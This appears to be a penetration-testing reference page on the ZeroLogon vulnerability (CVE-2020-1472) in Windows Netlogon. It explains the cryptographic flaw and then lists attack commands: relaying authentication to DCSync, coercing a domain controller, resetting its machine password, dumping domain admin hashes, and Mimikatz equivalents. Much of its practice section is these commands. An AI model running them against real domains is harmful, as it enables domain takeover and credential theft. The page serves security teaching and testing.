---
description: CVE-2020-1472
---

# ZeroLogon

## Theory

Netlogon is a service verifying logon requests, registering, authenticating, and locating domain controllers. MS-NRPC, the Netlogon Remote Protocol RPC interface is an authentication mechanism part of that service. MS-NRPC is used primarily to maintain the relationship between a machine and its domain, and relationships among domain controllers (DCs) and domains.

The CVE-2020-1472 findings demonstrated that MS-NRPC used a custom and insecure cryptographic protocol (i.e. it reuses a known, static, zero-value Initialization Vector (IV) in an AES-CFB8 mode) when establishing a Netlogon Secure Channel connection to a Domain Controller allowing for an Elevation of Privilege vulnerability.

There were many concepts to understand in the original exploit scenario (the "[password change](zerologon.md#password-change-disruptive)" one).

* **Concept #1**: authentication through MS-NRPC uses AES-CFB8. This means that for 1 in 256 possibilities, every block of the ciphertext will be `\x00` bytes if both the IV and the plaintext are `\x00` bytes.
* **Concept #2**: authentication through MS-NRPC uses a static and null IV (only `\x00` bytes, hence partly validating concept #1).
* **Concept #3**: MS-NRPC signing and sealing don't rely on the same vulnerable mechanisms but are optional and can be ignored.
* **Concept #4**: machine accounts have an unlimited number of login attempts, hence allowing for an authentication bypass and the spoofing of these accounts thanks to concepts #1 and #2 (by using a plaintext filled with `\x00` bytes and by doing enough attempts).
* **Concept #5**: the `NetrServerPasswordSet2`  call can be used to reset an account's password. The new password structure to supply in this call has to be encrypted with the same vulnerable mechanisms stated in concepts #1 and #2.
* **Concept #6**: the password structure can be filled with `\x00` bytes, leading to the setting a new password of a 0 characters length for the target account.
* **Concept #7**: all previous concepts can be chained to reset a domain controller's password and obtain domain-admin privileges.

## Practice

### Authentication relay technique

Another technique, [showcased by Dirk-jan](https://dirkjanm.io/a-different-way-of-abusing-zerologon/) no later than 2 weeks after the public disclosure, highlighted another way of exploiting the vulnerability. That technique relies on a [relayed authentication](../ntlm/relay.md) to directly operate a [DCSync](../credentials/dumping/dcsync.md), hence having no impact on the continuity of services.

In order to operate the attack, the [Impacket](https://github.com/SecureAuthCorp/impacket)'s script [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) (Python) can be used.

```bash
ntlmrelayx -t dcsync://$domain_controller_2 -smb2support
```

Once the relay servers are up and running and waiting for incoming trafic, attackers need to coerce a Domain Controller's authentication (or from another account with enough privileges). One way of doing this is to rely on the [PrinterBug](../mitm-and-coerced-authentications/ms-rprn.md).

```bash
dementor.py -d $domain -u $user -p $password $attacker_ip $domain_controller_1
```

### Password change ( :warning: disruptive)

{% hint style="danger" %}
This technique can break the domain's replication services hence leading to massive disruption, running the following "password change" technique is **not advised**.
{% endhint %}

This exploit scenario changes the NT hash of the domain controller computer account in Active Directory, but not in the local SAM database, hence creating some issues in Active Directory domains. In order to prevent disruption as much as possible, attackers can try to exploit the CVE, find the NT hash of the Domain Controller account before it was changed, and set it back in Active Directory.

{% tabs %}
{% tab title="UNIX-like" %}
The original attack path can be conducted from UNIX-like systems with the following Python scripts.

* [Secura BV's scanning PoC](https://github.com/SecuraBV/CVE-2020-1472)
* [Dirk-Jan's exploit script](https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py)
* [Dirk-Jan's restore script](https://github.com/dirkjanm/CVE-2020-1472/blob/master/restorepassword.py)

```bash
# Scan for the vulnerability
zerologon-scan 'DC_name' 'DC_IP_address'

# Exploit the vulnerability: set the NT hash to \x00*8
zerologon-exploit 'DC_name' 'DC_IP_address'

# Obtain the Domain Admin's NT hash
secretsdump -no-pass 'Domain'/'DC_computer_account$'@'Domain_controller'

# Obtain the machine account hex encoded password with the domain admin credentials
secretsdump -hashes :'NThash' 'Domain'/'Domain_admin'@'Domain_controller'

# Restore the machine account password
zerologon-restore 'Domain'/'DC_account'@'Domain_controller' -target-ip 'DC_IP_address' -hexpass 'DC_hexpass'
```
{% endtab %}

{% tab title="Windows" %}
The attack can also be conducted from Windows systems with [Mimikatz](https://github.com/gentilkiwi/mimikatz) (C) using [`lsadump::zerologon`](https://tools.thehacker.recipes/mimikatz/modules/lsadump/zerologon) to scan and exploit it, then obtain the krbtgt with [`lsadump::dcsync`](https://tools.thehacker.recipes/mimikatz/modules/lsadump/dcsync) and reset the DC account with [`lsadump::postzerologon`](https://tools.thehacker.recipes/mimikatz/modules/lsadump/postzerologon) or use [`lsadump::changentlm`](https://tools.thehacker.recipes/mimikatz/modules/lsadump/changentlm).

```bash
# Scan for the vulnerability
lsadump::zerologon /target:'Domain_controller' /account:'DC_account$'

# Exploit the vulnerability: set the NT hash to \x00*8
lsadump::zerologon /exploit /target:'Domain_controller' /account:'DC_account$'

# Obtain the krbtgt by DCSync
lsadump::dcsync /domain:'Domain' /dc:'Domain_controller' /user:'Administrator' /authuser:'DC_account$' /authdomain:'Domain' /authpassword:'' /authntlm

# Reset the DC account's password in AD and in its SAM base
lsadump::postzerologon /target:'Domain_Controller' /account:'DC_account$'

# (alternative to postezerologon) Find the previous NT hash
//TODO

# (alternative to postezerologon) Change the NT hash of the domain controller machine account in the AD back to its original value
lsadump::changentlm /server:'Domain_controller' /user:'DC_account$' /oldntlm:'31d6cfe0d16ae931b73c59d7e0c089c0' /newntlm:'previous_NThash'
```
{% endtab %}
{% endtabs %}

## References

{% embed url="https://www.secura.com/blog/zero-logon" %}

{% embed url="https://github.com/dirkjanm/CVE-2020-1472" %}

